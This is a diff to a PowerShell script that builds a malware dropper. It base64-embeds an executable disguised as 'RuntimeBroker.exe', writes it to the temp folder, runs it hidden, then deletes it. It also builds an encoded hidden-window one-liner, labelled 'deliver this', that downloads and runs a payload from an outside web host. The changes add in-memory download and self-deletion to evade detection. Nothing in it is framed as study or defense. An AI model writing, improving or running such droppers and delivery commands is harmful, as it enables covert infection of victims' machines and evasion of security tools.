@@ -16,9 +16,12 @@ $exeBytes = [IO.File]::ReadAllBytes("RuntimeBroker.exe")
 $b64 = [Convert]::ToBase64String($exeBytes)
 $loader = @"
 `$d = "$b64"
+`$b = [Convert]::FromBase64String(`$d)
 `$p = "`$env:TEMP\RuntimeBroker.exe"
-[IO.File]::WriteAllBytes(`$p, [Convert]::FromBase64String(`$d))
+[IO.File]::WriteAllBytes(`$p, `$b)
 Start-Process -WindowStyle Hidden `$p
+Start-Sleep -Milliseconds 500
+Remove-Item `$p -Force
 "@
 Set-Content -Path "loader.ps1" -Value $loader
 
@@ -55,7 +58,7 @@ try {
     Write-Output "Uploaded to: $sbUrl/storage/v1/object/public/$bucket/$object"
     Write-Output ""
     Write-Output "=== ONE-LINER (deliver this) ==="
-    $rawCmd = "iwr 'https://allseeing.netlify.app/a' -OutFile `$env:tmp\a.exe; start `$env:tmp\a.exe"
+    $rawCmd = "`$wc=New-Object Net.WebClient;`$b=`$wc.DownloadData('https://allseeing.netlify.app/a');`$p=`$env:tmp+'\a.exe';[IO.File]::WriteAllBytes(`$p,`$b);start `$p;sleep -m 500;ri `$p -Force"
     $encBytes = [System.Text.Encoding]::Unicode.GetBytes($rawCmd)
     $encCmd = [Convert]::ToBase64String($encBytes)
     Write-Output "powershell -w h -Enc $encCmd"
